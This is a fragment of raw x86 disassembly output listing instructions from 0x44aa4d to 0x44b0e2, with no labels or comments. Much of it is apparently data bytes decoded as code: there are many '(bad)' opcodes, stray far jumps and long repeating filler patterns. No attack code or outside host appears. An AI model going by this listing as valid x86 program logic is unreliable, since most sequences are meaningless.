  44aa4d:	cmp    al,0x3b
  44aa4f:	push   es
  44aa50:	xlat   BYTE PTR ds:[ebx]
  44aa51:	xchg   ebx,eax
  44aa52:	cmp    ecx,DWORD PTR [ebp-0x29]
  44aa55:	mov    edi,0xa0d6ef3b
  44aa5a:	cmp    al,0x3d
  44aa5c:	(bad)  
  44aa5d:	dec    esi
  44aa5e:	cmp    eax,0x3db1d60f
  44aa63:	(bad)  
  44aa64:	(bad)  
  44aa65:	mov    ah,0x3d
  44aa67:	rcl    esi,0xce
  44aa6a:	cmp    eax,0x3dddd6a3
  44aa6f:	cmp    ebx,DWORD PTR [eax-0x6459c1f3]
  44aa75:	je     0x44aab5
  44aa77:	add    dh,ah
  44aa79:	call   0x3f7c:0x98be3eeb
  44aa80:	mov    edi,0x4b3fbc98
  44aa85:	pop    edx
  44aa86:	add    eax,DWORD PTR [eax]
  44aa88:	ja     0x44aa67
  44aa8a:	add    BYTE PTR [eax],al
  44aa8c:	add    al,0xca
  44aa8e:	inc    ecx
  44aa8f:	xor    BYTE PTR [ebp+ecx*8+0x46],dl
  44aa93:	xor    BYTE PTR [edi-0x33],dh
  44aa96:	pop    esi
  44aa97:	xor    BYTE PTR [esi],cl
  44aa99:	retf   0x306c
  44aa9c:	jns    0x44aa6b
  44aa9e:	mov    BYTE PTR [eax],dh
  44aaa0:	jne    0x44aa6f
  44aaa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44aaa3:	xor    BYTE PTR [esi],bh
  44aaa5:	int    0xbc
  44aaa7:	xor    BYTE PTR [edx-0x2e],ah
  44aaaa:	sub    al,0xdc
  44aaac:	xor    bl,BYTE PTR [ebx-0x246d0cd4]
  44aab2:	xor    DWORD PTR [edi-0x6d],ecx
  44aab5:	mov    ch,0x31
  44aab7:	test   al,0x93
  44aab9:	lahf   
  44aaba:	xor    DWORD PTR [eax+edx*4],edi
  44aabd:	test   BYTE PTR [esi],ch
  44aabf:	retf   
  44aac0:	jo     0x44ab09
  44aac2:	cs pop esp
  44aac4:	outs   dx,BYTE PTR ds:[esi]
  44aac5:	mov    edi,DWORD PTR [eax]
  44aac7:	div    DWORD PTR [esi+0x18]
  44aaca:	das    
  44aacb:	push   eax
  44aacc:	outs   dx,DWORD PTR ds:[esi]
  44aacd:	cli    
  44aace:	aaa    
  44aacf:	rcl    DWORD PTR [esi+ebx*2+0x39],cl
  44aad3:	xor    DWORD PTR [edx+0x7a],ebx
  44aad6:	xor    al,0x15
  44aad8:	dec    ebx
  44aad9:	mov    edi,0x4600ab39
  44aade:	data16 aaa 
  44aae0:	add    BYTE PTR [edx+0x0],ah
  44aae3:	xchg   edx,eax
  44aae4:	add    ah,BYTE PTR [edx+0x10]
  44aae7:	add    al,BYTE PTR [eax]
  44aae9:	bound  esp,QWORD PTR [ebx]
  44aaeb:	xor    dh,ah
  44aaed:	xor    eax,DWORD PTR [ecx+0x291972b]
  44aaf3:	mov    ds:0xfcf26202,al
  44aaf8:	jmp    DWORD PTR [edx+0x16]
  44aafb:	xor    dl,BYTE PTR [edx+edx*4-0x59]
  44aaff:	sub    eax,0x2f6f775c
  44ab04:	or     ch,BYTE PTR [esi+esi*1+0x38]
  44ab08:	addr16 jne 0x44aaf4
  44ab0b:	aaa    
  44ab0c:	jbe    0x44ab7b
  44ab0e:	mov    cl,0x38
  44ab10:	outs   dx,BYTE PTR ds:[esi]
  44ab11:	pop    edx
  44ab12:	test   BYTE PTR [ecx],bh
  44ab14:	loop   0x44ab70
  44ab16:	sbb    edi,DWORD PTR [ebx]
  44ab18:	xor    DWORD PTR [ebx+0x13],ecx
  44ab1b:	cmp    eax,DWORD PTR [ecx-0x24c48ab5]
  44ab21:	cmp    ebx,ecx
  44ab23:	mov    bh,0x3d
  44ab25:	cdq    
  44ab26:	iret   
  44ab27:	outs   dx,DWORD PTR ds:[esi]
  44ab28:	cmp    eax,0x3d1fcfd1
  44ab2d:	sbb    eax,0xb73d2dd0
  44ab32:	iret   
  44ab33:	inc    ebx
  44ab34:	cmp    eax,0x3d39cfc9
  44ab39:	out    dx,eax
  44ab3a:	(bad)  
  44ab3b:	jae    0x44ab7b
  44ab3d:	mov    ds:0x3e15d6,eax
  44ab42:	(bad)  
  44ab43:	(bad)  
  44ab45:	mov    bl,0x60
  44ab47:	fpatan 
  44ab49:	add    esp,DWORD PTR [edx-0x27]
  44ab4c:	stos   BYTE PTR es:[edi],al
  44ab4d:	xor    eax,0x3592c73e
  44ab52:	mov    cl,0xce
  44ab54:	sti    
  44ab55:	xor    eax,0x3a40cb69
  44ab5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ab5b:	sar    BYTE PTR [esi+edi*1-0x3c18269e],cl
  44ab62:	pusha  
  44ab63:	fld    DWORD PTR [edi]
  44ab65:	add    al,0x62
  44ab67:	fld    st(2)
  44ab69:	xor    ch,BYTE PTR [esi-0x39]
  44ab6c:	inc    ebp
  44ab6d:	xor    ecx,DWORD PTR [edi-0x32]
  44ab70:	add    BYTE PTR [edi],dh
  44ab72:	mov    eax,ds:0x393d18d2
  44ab77:	iret   
  44ab78:	(bad)  
  44ab79:	cmp    esi,DWORD PTR [eax-0x2b]
  44ab7c:	push   cs
  44ab7d:	inc    eax
  44ab7e:	(bad)  
  44ab7f:	(bad)  
  44ab81:	shl    DWORD PTR [eax-0x27],cl
  44ab84:	pop    es
  44ab85:	add    al,0x62
  44ab87:	fld    DWORD PTR [eax-0x235becb]
  44ab8d:	xor    al,ch
  44ab8f:	(bad)  
  44ab90:	ins    DWORD PTR es:[edi],dx
  44ab91:	cmp    al,0x5c
  44ab93:	iret   
  44ab94:	sub    al,0x40
  44ab96:	rcl    esp,0xb3
  44ab99:	cmp    eax,0x2d00d3a2
  44ab9e:	inc    esp
  44ab9f:	mov    eax,ds:0xa93c1d36
  44aba4:	ss mov ebp,0x36b13700
  44abaa:	mov    ebp,0xcd36792f
  44abaf:	daa    
  44abb0:	xor    DWORD PTR [esi],0x36899fbd
  44abb6:	mov    ebp,0xbd369197
  44abbb:	(bad)  
  44abbc:	pop    ecx
  44abbd:	aaa    
  44abbe:	ins    DWORD PTR es:[edi],dx
  44abbf:	test   BYTE PTR [ecx+0x37],ah
  44abc2:	pop    ebp
  44abc3:	jl     0x44ac2e
  44abc5:	aaa    
  44abc6:	jge    0x44ac3c
  44abc8:	jno    0x44ac01
  44abca:	jge    0x44ac38
  44abcc:	cmp    DWORD PTR [edi],esi
  44abce:	dec    ebp
  44abcf:	fs inc ecx
  44abd1:	aaa    
  44abd2:	cmp    eax,0x3d37495c
  44abd7:	push   esp
  44abd8:	push   ecx
  44abd9:	aaa    
  44abda:	cmp    eax,0x2d37194c
  44abdf:	inc    esp
  44abe0:	fld    DWORD PTR [eax]
  44abe2:	jmp    0x41458268
  44abe7:	pop    esi
  44abe8:	fld    DWORD PTR [eax]
  44abea:	pop    ss
  44abeb:	xor    BYTE PTR ss:[eax],0x5b
  44abef:	mov    esi,DWORD PTR cs:[eax]
  44abf2:	arpl   WORD PTR [ecx-0x6e86ce95],dx
  44abf8:	dec    ebp
  44abf9:	xor    DWORD PTR [eax-0x46ceff6f],esi
  44abff:	xchg   ecx,eax
  44ac00:	or     eax,0xed76e131
  44ac05:	das    
  44ac06:	xlat   BYTE PTR ds:[ebx]
  44ac07:	outs   dx,BYTE PTR ds:[esi]
  44ac08:	iret   
  44ac09:	das    
  44ac0a:	add    BYTE PTR es:[edi+0x78],dh
  44ac0e:	das    
  44ac0f:	pop    es
  44ac10:	outs   dx,DWORD PTR ds:[esi]
  44ac11:	(bad)  
  44ac12:	das    
  44ac13:	addr16 push esi
  44ac15:	outs   dx,DWORD PTR ds:[esi]
  44ac16:	xor    BYTE PTR [eax],al
  44ac18:	scas   eax,DWORD PTR es:[edi]
  44ac19:	int    0xb8
  44ac1b:	xor    esi,eax
  44ac1d:	int    0xd3
  44ac1f:	xor    DWORD PTR [ecx+0x131eecd],ecx
  44ac25:	leave  
  44ac26:	push   cs
  44ac27:	xor    bl,BYTE PTR [ebx-0x39]
  44ac2a:	sub    al,0x32
  44ac2c:	mov    dl,0xc8
  44ac2e:	jno    0x44ac62
  44ac30:	jbe    0x44abfa
  44ac32:	(bad)  
  44ac33:	xor    cl,BYTE PTR [esi-0x38]
  44ac36:	mov    edi,0xa8d50932
  44ac3b:	ds mov ebx,0x63000306
  44ac41:	fld    QWORD PTR [eax]
  44ac43:	add    al,bl
  44ac45:	(bad)  
  44ac46:	fnsave [eax]
  44ac48:	retf   
  44ac49:	int    0x76
  44ac4b:	xor    DWORD PTR [edi],esi
  44ac4d:	int    0x30
  44ac4f:	xor    bh,cl
  44ac51:	enter  0x34ec,0x85
  44ac55:	rol    DWORD PTR [esi],1
  44ac57:	xor    eax,0x37d3cb78
  44ac5c:	xchg   esp,eax
  44ac5d:	int3   
  44ac5e:	pop    es
  44ac5f:	cmp    BYTE PTR [ebx-0x74c41c30],cl
  44ac65:	(bad)  
  44ac66:	hlt    
  44ac67:	inc    DWORD PTR [ebx-0x23]
  44ac6a:	add    BYTE PTR [eax],al
  44ac6c:	scas   eax,DWORD PTR es:[edi]
  44ac6d:	(bad)  
  44ac6e:	aaa    
  44ac6f:	xor    al,BYTE PTR [eax]
  44ac71:	ss (bad) 
  44ac73:	stc    
  44ac74:	xor    al,0x98
  44ac76:	retf   0x35cc
  44ac79:	dec    ebx
  44ac7a:	int3   
  44ac7b:	mov    eax,ds:0xbdcbcc36
  44ac80:	ss sbb eax,0x1d372ccb
  44ac86:	iret   
  44ac87:	add    edi,DWORD PTR [ecx]
  44ac89:	pop    esp
  44ac8a:	into   
  44ac8b:	sbb    al,0x39
  44ac8d:	loop   0x44ac5e
  44ac8f:	add    eax,0x361f623c
  44ac94:	inc    eax
  44ac95:	pop    esi
  44ac96:	into   
  44ac97:	inc    eax
  44ac98:	xor    eax,0x35eb57
  44ac9d:	bound  eax,QWORD PTR [eax]
  44ac9f:	adc    bh,ah
  44aca1:	add    eax,0x62fffcc8
  44aca6:	imul   ebp,DWORD PTR ds:0x31b132dd,0x31103108
  44acb0:	sub    BYTE PTR [ecx],dh
  44acb2:	xor    BYTE PTR fs:[edx+0x642e1a91],ch
  44acb9:	mov    cs,WORD PTR [esi+0x2e]
  44acbc:	js     0x44ac54
  44acbe:	push   edx
  44acbf:	cs jl  0x44ac50
  44acc2:	ja     0x44acfc
  44acc4:	xchg   edx,eax
  44acc5:	jbe    0x44ac70
  44acc7:	cmp    BYTE PTR [eax-0x59c75c92],ah
  44accd:	jbe    0x44ac7c
  44accf:	cmp    BYTE PTR [ebp-0x3ac73a92],dh
  44acd5:	add    BYTE PTR [esi-0x37],dl
  44acd8:	cmp    dl,ah
  44acda:	dec    esi
  44acdb:	jecxz  0x44ad15
  44acdd:	in     eax,0x56
  44acdf:	or     ebp,DWORD PTR [esi]
  44ace1:	add    BYTE PTR [edi-0x9],cl
  44ace4:	sbb    DWORD PTR cs:[edi],esi
  44ace7:	and    ch,BYTE PTR [edi]
  44ace9:	sbb    al,0x2f
  44aceb:	jmp    0x44ad1a
  44aced:	cs aaa 
  44acef:	pop    ss
  44acf0:	das    
  44acf1:	fsubr  QWORD PTR [edi]
  44acf3:	xchg   ebx,eax
  44acf4:	sub    ebx,DWORD PTR [ebp+0x522be594]
  44acfa:	lea    esi,[edi+0x2c]
  44acfd:	pushf  
  44acfe:	xchg   ebp,eax
  44acff:	xchg   BYTE PTR [esi*4-0x3bc5a773],ch
  44ad06:	jp     0x44ad7a
  44ad08:	cmp    dl,ah
  44ad0a:	jp     0x44ace5
  44ad0c:	xchg   DWORD PTR [ebx],edi
  44ad0e:	inc    esi
  44ad0f:	rcl    BYTE PTR [edi-0x182dd1c5],cl
  44ad15:	cmp    ah,BYTE PTR [esi-0x2e]
  44ad18:	idiv   DWORD PTR [edx]
  44ad1a:	outs   dx,BYTE PTR ds:[esi]
  44ad1b:	rol    bh,cl
  44ad1d:	cmp    al,BYTE PTR [esi-0x2e]
  44ad20:	mov    bh,0x3a
  44ad22:	dec    esi
  44ad23:	shl    BYTE PTR [edi],cl
  44ad25:	cmp    esp,DWORD PTR [esi-0x71c4e82e]
  44ad2b:	rol    bh,cl
  44ad2d:	cmp    al,BYTE PTR [esi+0x6e3ad7d2]
  44ad33:	shl    BYTE PTR [edi+0x3a],cl
  44ad36:	out    0xd2,al
  44ad38:	ja     0x44ad74
  44ad3a:	add    dh,ch
  44ad3c:	rol    BYTE PTR [edi+0x77d3063a],cl
  44ad42:	cmp    cl,BYTE PTR [esi]
  44ad44:	shl    DWORD PTR [edi],cl
  44ad46:	cmp    ah,BYTE PTR [esi-0x71c5e82e]
  44ad4c:	rol    BYTE PTR [edi],cl
  44ad4e:	cmp    al,dh
  44ad50:	rcl    BYTE PTR [edi],cl
  44ad52:	cmp    ch,BYTE PTR [esi+0x6239e7d2]
  44ad58:	(bad)  
  44ad5a:	arpl   WORD PTR [esi+0x62033810],dx
  44ad60:	(bad)  
  44ad62:	xor    eax,DWORD PTR [esi+0x5a33d3c0]
  44ad68:	leave  
  44ad69:	mov    bl,0x33
  44ad6b:	adc    cl,ah
  44ad6d:	xor    esi,DWORD PTR [edi]
  44ad6f:	push   ss
  44ad70:	int3   
  44ad71:	inc    ebx
  44ad72:	aaa    
  44ad73:	out    dx,al
  44ad74:	retf   
  44ad75:	pop    ebx
  44ad76:	aaa    
  44ad77:	test   bl,0x73
  44ad7a:	aaa    
  44ad7b:	push   cs
  44ad7c:	int3   
  44ad7d:	stos   DWORD PTR es:[edi],eax
  44ad7e:	aaa    
  44ad7f:	ss int3 
  44ad81:	ret    
  44ad82:	aaa    
  44ad83:	dec    esi
  44ad84:	int3   
  44ad85:	add    ch,ah
  44ad87:	(bad)  
  44ad88:	in     eax,0x2c
  44ad8a:	std    
  44ad8b:	test   ebp,eax
  44ad8d:	sub    al,0x35
  44ad8f:	jb     0x44ad36
  44ad91:	sub    al,0xd
  44ad93:	jb     0x44ad1a
  44ad95:	sub    al,0x65
  44ad97:	push   edx
  44ad98:	gs sub eax,0x2d45523d
  44ad9e:	mov    ch,0x0
  44ada0:	push   edx
  44ada1:	and    eax,0x5528d2d
  44ada6:	sub    eax,0x2be532e5
  44adab:	mov    ebp,0xb52bc532
  44adb0:	xor    ah,BYTE PTR [ebp-0x7acd32d5]
  44adb6:	sub    esp,DWORD PTR [ebp-0x6d]
  44adb9:	gs sub al,0x81
  44adbc:	xchg   ebx,eax
  44adbd:	xor    eax,0x3d93792c
  44adc2:	sub    al,0x81
  44adc4:	xchg   ebx,eax
  44adc5:	inc    ebp
  44adc6:	sub    al,0x29
  44adc8:	jae    0x44ae17
  44adca:	sub    al,0x21
  44adcc:	jae    0x44ade3
  44adce:	sub    al,0x39
  44add0:	jae    0x44adef
  44add2:	sub    al,0x41
  44add4:	jae    0x44adfb
  44add6:	sub    al,0x9
  44add8:	push   ebx
  44add9:	sub    eax,0xf553012c
  44adde:	sub    edi,ecx
  44ade0:	push   edx
  44ade1:	std    
  44ade2:	sub    eax,DWORD PTR [ecx]
  44ade4:	push   ebx
  44ade5:	add    eax,0xd33e92c
  44adea:	sub    al,0xe1
  44adec:	xor    edx,ebp
  44adee:	cs stc 
  44adf0:	xor    edi,DWORD PTR [ecx-0x3ecffad2]
  44adf6:	cs add eax,0x152ec990
  44adfc:	nop
  44adfd:	shr    DWORD PTR [esi],1
  44adff:	add    BYTE PTR [edi-0x35],ah
  44ae02:	inc    eax
  44ae03:	add    BYTE PTR ss:[edi-0x35],bh
  44ae07:	dec    eax
  44ae08:	ss xchg ebx,ecx
  44ae0b:	add    BYTE PTR [eax],al
  44ae0d:	dec    ebx
  44ae0e:	fild   DWORD PTR [eax]
  44ae10:	add    BYTE PTR [ebx],bh
  44ae12:	fild   DWORD PTR [eax]
  44ae14:	add    BYTE PTR [ebx],bh
  44ae16:	fild   DWORD PTR [eax]
  44ae18:	add    BYTE PTR [ebx],cl
  44ae1a:	fild   DWORD PTR [eax]
  44ae1c:	add    BYTE PTR [ebx],cl
  44ae1e:	fild   DWORD PTR [eax]
  44ae20:	add    bl,bh
  44ae22:	fiadd  DWORD PTR [eax]
  44ae24:	add    bl,bh
  44ae26:	fiadd  DWORD PTR [eax]
  44ae28:	add    BYTE PTR [ebx],cl
  44ae2a:	fild   DWORD PTR [eax]
  44ae2c:	add    BYTE PTR [ebx],cl
  44ae2e:	fild   DWORD PTR [eax]
  44ae30:	add    bl,bh
  44ae32:	fiadd  DWORD PTR [eax]
  44ae34:	add    bl,bh
  44ae36:	fiadd  DWORD PTR [eax]
  44ae38:	add    bl,cl
  44ae3a:	fiadd  DWORD PTR [eax]
  44ae3c:	add    bl,cl
  44ae3e:	fiadd  DWORD PTR [eax]
  44ae40:	add    BYTE PTR [ebx-0x44ffff26],bh
  44ae46:	fiadd  DWORD PTR [eax]
  44ae48:	add    bl,cl
  44ae4a:	fiadd  DWORD PTR [eax]
  44ae4c:	add    bl,cl
  44ae4e:	fiadd  DWORD PTR [eax]
  44ae50:	add    BYTE PTR [ebx-0x44ffff26],bh
  44ae56:	fiadd  DWORD PTR [eax]
  44ae58:	add    BYTE PTR [ebx-0x74ffff26],cl
  44ae5e:	fiadd  DWORD PTR [eax]
  44ae60:	add    BYTE PTR [ebx-0x26],bh
  44ae63:	add    BYTE PTR [eax],al
  44ae65:	jnp    0x44ae41
  44ae67:	add    BYTE PTR [eax],al
  44ae69:	add    BYTE PTR [ebx-0x74ffff26],cl
  44ae6f:	fiadd  DWORD PTR [eax]
  44ae71:	add    BYTE PTR [ebx-0x26],bh
  44ae74:	add    BYTE PTR [eax],al
  44ae76:	jnp    0x44ae52
  44ae78:	add    BYTE PTR [eax],al
  44ae7a:	bound  eax,QWORD PTR [eax]
  44ae7c:	add    al,BYTE PTR [eax]
  44ae7e:	bound  eax,QWORD PTR [eax]
  44ae80:	add    al,BYTE PTR [eax]
  44ae82:	bound  eax,QWORD PTR [eax]
  44ae84:	add    al,BYTE PTR [eax]
  44ae86:	bound  eax,QWORD PTR [eax]
  44ae88:	add    al,BYTE PTR [eax]
  44ae8a:	bound  eax,QWORD PTR [eax]
  44ae8c:	add    al,BYTE PTR [eax]
  44ae8e:	bound  eax,QWORD PTR [eax]
  44ae90:	add    al,BYTE PTR [eax]
  44ae92:	bound  eax,QWORD PTR [eax]
  44ae94:	add    al,BYTE PTR [eax]
  44ae96:	bound  eax,QWORD PTR [eax]
  44ae98:	add    al,BYTE PTR [eax]
  44ae9a:	bound  eax,QWORD PTR [eax]
  44ae9c:	add    al,BYTE PTR [eax]
  44ae9e:	bound  eax,QWORD PTR [eax]
  44aea0:	add    al,BYTE PTR [eax]
  44aea2:	bound  eax,QWORD PTR [eax]
  44aea4:	add    al,BYTE PTR [eax]
  44aea6:	bound  eax,QWORD PTR [eax]
  44aea8:	add    al,BYTE PTR [eax]
  44aeaa:	bound  eax,QWORD PTR [eax]
  44aeac:	add    al,BYTE PTR [eax]
  44aeae:	bound  eax,QWORD PTR [eax]
  44aeb0:	add    al,BYTE PTR [eax]
  44aeb2:	bound  eax,QWORD PTR [eax]
  44aeb4:	add    al,BYTE PTR [eax]
  44aeb6:	bound  eax,QWORD PTR [eax]
  44aeb8:	add    al,BYTE PTR [eax]
  44aeba:	bound  eax,QWORD PTR [eax]
  44aebc:	add    al,BYTE PTR [eax]
  44aebe:	bound  eax,QWORD PTR [eax]
  44aec0:	add    al,BYTE PTR [eax]
  44aec2:	bound  eax,QWORD PTR [eax]
  44aec4:	add    al,BYTE PTR [eax]
  44aec6:	bound  eax,QWORD PTR [eax]
  44aec8:	add    al,BYTE PTR [eax]
  44aeca:	bound  eax,QWORD PTR [eax]
  44aecc:	add    al,BYTE PTR [eax]
  44aece:	add    BYTE PTR [edx+0x0],ah
  44aed1:	add    al,BYTE PTR [eax]
  44aed3:	bound  eax,QWORD PTR [eax]
  44aed5:	add    al,BYTE PTR [eax]
  44aed7:	bound  eax,QWORD PTR [eax]
  44aed9:	add    al,BYTE PTR [eax]
  44aedb:	bound  eax,QWORD PTR [eax]
  44aedd:	add    al,BYTE PTR [eax]
  44aedf:	bound  eax,QWORD PTR [eax]
  44aee1:	add    al,BYTE PTR [eax]
  44aee3:	bound  eax,QWORD PTR [eax]
  44aee5:	add    al,BYTE PTR [eax]
  44aee7:	bound  eax,QWORD PTR [eax]
  44aee9:	add    al,BYTE PTR [eax]
  44aeeb:	bound  eax,QWORD PTR [eax]
  44aeed:	add    al,BYTE PTR [eax]
  44aeef:	bound  eax,QWORD PTR [eax]
  44aef1:	add    al,BYTE PTR [eax]
  44aef3:	(bad)  
  44aef4:	(bad)  
  44aef6:	add    esp,DWORD PTR [edx-0x27]
  44aef9:	out    0x3,eax
  44aefb:	(bad)  
  44aefc:	(bad)  
  44aefe:	add    esp,DWORD PTR [edx-0x27]
  44af01:	out    0x3,eax
  44af03:	(bad)  
  44af04:	(bad)  
  44af06:	add    esp,DWORD PTR [edx-0x27]
  44af09:	out    0x3,eax
  44af0b:	(bad)  
  44af0c:	(bad)  
  44af0e:	add    esp,DWORD PTR [edx-0x27]
  44af11:	out    0x3,eax
  44af13:	(bad)  
  44af14:	(bad)  
  44af16:	add    esp,DWORD PTR [edx-0x27]
  44af19:	out    0x3,eax
  44af1b:	(bad)  
  44af1c:	(bad)  
  44af1e:	add    esp,DWORD PTR [edx-0x27]
  44af21:	out    0x3,eax
  44af23:	(bad)  
  44af24:	(bad)  
  44af26:	add    esp,DWORD PTR [edx-0x27]
  44af29:	out    0x3,eax
  44af2b:	(bad)  
  44af2c:	(bad)  
  44af2e:	add    esp,DWORD PTR [edx-0x27]
  44af31:	out    0x3,eax
  44af33:	add    BYTE PTR [edx-0x27],ah
  44af36:	out    0x3,eax
  44af38:	(bad)  
  44af39:	(bad)  
  44af3b:	add    esp,DWORD PTR [edx-0x27]
  44af3e:	out    0x3,eax
  44af40:	(bad)  
  44af41:	(bad)  
  44af43:	add    esp,DWORD PTR [edx-0x27]
  44af46:	out    0x3,eax
  44af48:	(bad)  
  44af49:	(bad)  
  44af4b:	add    esp,DWORD PTR [edx-0x27]
  44af4e:	out    0x3,eax
  44af50:	(bad)  
  44af51:	(bad)  
  44af53:	add    esp,DWORD PTR [edx-0x27]
  44af56:	out    0x3,eax
  44af58:	(bad)  
  44af59:	(bad)  
  44af5b:	add    esp,DWORD PTR [edx-0x27]
  44af5e:	out    0x3,eax
  44af60:	(bad)  
  44af61:	(bad)  
  44af63:	add    esp,DWORD PTR [edx-0x27]
  44af66:	out    0x3,eax
  44af68:	(bad)  
  44af69:	(bad)  
  44af6b:	add    esp,DWORD PTR [edx-0x27]
  44af6e:	add    cl,ch
  44af70:	popa   
  44af71:	fld    DWORD PTR [eax]
  44af73:	jmp    0xe94588d9
  44af78:	popa   
  44af79:	fld    DWORD PTR [eax]
  44af7b:	jmp    0xe94588e1
  44af80:	popa   
  44af81:	fld    DWORD PTR [eax]
  44af83:	jmp    0xe94588e9
  44af88:	popa   
  44af89:	fld    DWORD PTR [eax]
  44af8b:	jmp    0xe94588f1
  44af90:	popa   
  44af91:	fld    DWORD PTR [eax]
  44af93:	jmp    0xe94588f9
  44af98:	add    BYTE PTR [ecx-0x27],ah
  44af9b:	add    cl,ch
  44af9d:	popa   
  44af9e:	fld    DWORD PTR [eax]
  44afa0:	jmp    0xe9458906
  44afa5:	popa   
  44afa6:	fld    DWORD PTR [eax]
  44afa8:	jmp    0xe945890e
  44afad:	popa   
  44afae:	fld    DWORD PTR [eax]
  44afb0:	jmp    0xe9458916
  44afb5:	popa   
  44afb6:	fld    DWORD PTR [eax]
  44afb8:	jmp    0xe945891e
  44afbd:	popa   
  44afbe:	fld    DWORD PTR [eax]
  44afc0:	jmp    0xe9458926
  44afc5:	popa   
  44afc6:	fld    DWORD PTR [eax]
  44afc8:	jmp    0xe945892e
  44afcd:	popa   
  44afce:	fld    DWORD PTR [eax]
  44afd0:	jmp    0xe9458936
  44afd5:	popa   
  44afd6:	fld    DWORD PTR [eax]
  44afd8:	jmp    0xe945893e
  44afdd:	popa   
  44afde:	fld    DWORD PTR [eax]
  44afe0:	jmp    0xe9458946
  44afe5:	popa   
  44afe6:	fld    DWORD PTR [eax]
  44afe8:	add    BYTE PTR [ebx-0x29],bh
  44afeb:	add    BYTE PTR [eax],al
  44afed:	mov    edx,edi
  44afef:	add    BYTE PTR [eax],al
  44aff1:	mov    edx,edi
  44aff3:	add    BYTE PTR [eax],al
  44aff5:	jnp    0x44afce
  44aff7:	add    BYTE PTR [eax],al
  44aff9:	jnp    0x44afd2
  44affb:	add    BYTE PTR [eax],al
  44affd:	add    BYTE PTR [ebx-0x29],cl
  44b000:	add    BYTE PTR [eax],al
  44b002:	dec    ebx
  44b003:	xlat   BYTE PTR ds:[ebx]
  44b004:	add    BYTE PTR [eax],al
  44b006:	cmp    edx,edi
  44b008:	add    BYTE PTR [eax],al
  44b00a:	cmp    edx,edi
  44b00c:	add    BYTE PTR [eax],al
  44b00e:	dec    ebx
  44b00f:	xlat   BYTE PTR ds:[ebx]
  44b010:	add    BYTE PTR [eax],al
  44b012:	dec    ebx
  44b013:	xlat   BYTE PTR ds:[ebx]
  44b014:	add    BYTE PTR [eax],al
  44b016:	cmp    edx,edi
  44b018:	add    BYTE PTR [eax],al
  44b01a:	cmp    edx,edi
  44b01c:	add    BYTE PTR [eax],al
  44b01e:	or     edx,edi
  44b020:	add    BYTE PTR [eax],al
  44b022:	or     edx,edi
  44b024:	add    BYTE PTR [eax],al
  44b026:	sti    
  44b027:	(bad)  
  44b028:	add    BYTE PTR [eax],al
  44b02a:	sti    
  44b02b:	(bad)  
  44b02c:	add    BYTE PTR [eax],al
  44b02e:	or     edx,edi
  44b030:	add    BYTE PTR [eax],al
  44b032:	or     edx,edi
  44b034:	add    BYTE PTR [eax],al
  44b036:	sti    
  44b037:	(bad)  
  44b038:	add    BYTE PTR [eax],al
  44b03a:	sti    
  44b03b:	(bad)  
  44b03c:	add    BYTE PTR [eax],al
  44b03e:	retf   
  44b03f:	(bad)  
  44b040:	add    BYTE PTR [eax],al
  44b042:	retf   
  44b043:	(bad)  
  44b044:	add    BYTE PTR [eax],al
  44b046:	mov    ebx,0xbb0000d6
  44b04b:	(bad)  
  44b04c:	add    BYTE PTR [eax],al
  44b04e:	retf   
  44b04f:	(bad)  
  44b050:	add    BYTE PTR [eax],al
  44b052:	retf   
  44b053:	(bad)  
  44b054:	add    BYTE PTR [eax],al
  44b056:	mov    ebx,0xbb0000d6
  44b05b:	(bad)  
  44b05c:	add    BYTE PTR [eax],al
  44b05e:	mov    edx,esi
  44b060:	add    BYTE PTR [eax],al
  44b062:	add    BYTE PTR [edx+0x0],ah
  44b065:	add    al,BYTE PTR [eax]
  44b067:	bound  eax,QWORD PTR [eax]
  44b069:	add    al,BYTE PTR [eax]
  44b06b:	bound  eax,QWORD PTR [eax]
  44b06d:	add    al,BYTE PTR [eax]
  44b06f:	bound  eax,QWORD PTR [eax]
  44b071:	add    al,BYTE PTR [eax]
  44b073:	bound  eax,QWORD PTR [eax]
  44b075:	add    al,BYTE PTR [eax]
  44b077:	bound  eax,QWORD PTR [eax]
  44b079:	add    al,BYTE PTR [eax]
  44b07b:	bound  eax,QWORD PTR [eax]
  44b07d:	add    al,BYTE PTR [eax]
  44b07f:	bound  eax,QWORD PTR [eax]
  44b081:	add    al,BYTE PTR [eax]
  44b083:	bound  eax,QWORD PTR [eax]
  44b085:	add    al,BYTE PTR [eax]
  44b087:	bound  eax,QWORD PTR [eax]
  44b089:	add    al,BYTE PTR [eax]
  44b08b:	bound  eax,QWORD PTR [eax]
  44b08d:	add    al,BYTE PTR [eax]
  44b08f:	bound  eax,QWORD PTR [eax]
  44b091:	add    al,BYTE PTR [eax]
  44b093:	bound  eax,QWORD PTR [eax]
  44b095:	add    al,BYTE PTR [eax]
  44b097:	bound  eax,QWORD PTR [eax]
  44b099:	add    al,BYTE PTR [eax]
  44b09b:	bound  eax,QWORD PTR [eax]
  44b09d:	add    al,BYTE PTR [eax]
  44b09f:	bound  eax,QWORD PTR [eax]
  44b0a1:	add    al,BYTE PTR [eax]
  44b0a3:	bound  eax,QWORD PTR [eax]
  44b0a5:	add    al,BYTE PTR [eax]
  44b0a7:	bound  eax,QWORD PTR [eax]
  44b0a9:	add    al,BYTE PTR [eax]
  44b0ab:	bound  eax,QWORD PTR [eax]
  44b0ad:	add    al,BYTE PTR [eax]
  44b0af:	bound  eax,QWORD PTR [eax]
  44b0b1:	add    al,BYTE PTR [eax]
  44b0b3:	bound  eax,QWORD PTR [eax]
  44b0b5:	add    al,BYTE PTR [eax]
  44b0b7:	bound  eax,QWORD PTR [eax]
  44b0b9:	add    al,BYTE PTR [eax]
  44b0bb:	bound  eax,QWORD PTR [eax]
  44b0bd:	add    al,BYTE PTR [eax]
  44b0bf:	bound  eax,QWORD PTR [eax]
  44b0c1:	add    al,BYTE PTR [eax]
  44b0c3:	bound  eax,QWORD PTR [eax]
  44b0c5:	add    al,BYTE PTR [eax]
  44b0c7:	add    BYTE PTR [edx+0x0],ah
  44b0ca:	add    al,BYTE PTR [eax]
  44b0cc:	bound  eax,QWORD PTR [eax]
  44b0ce:	add    al,BYTE PTR [eax]
  44b0d0:	bound  eax,QWORD PTR [eax]
  44b0d2:	add    al,BYTE PTR [eax]
  44b0d4:	bound  eax,QWORD PTR [eax]
  44b0d6:	add    al,BYTE PTR [eax]
  44b0d8:	bound  eax,QWORD PTR [eax]
  44b0da:	add    al,BYTE PTR [eax]
  44b0dc:	(bad)  
  44b0dd:	(bad)  
  44b0df:	add    esp,DWORD PTR [edx-0x27]
  44b0e2:	out    0x3,eax
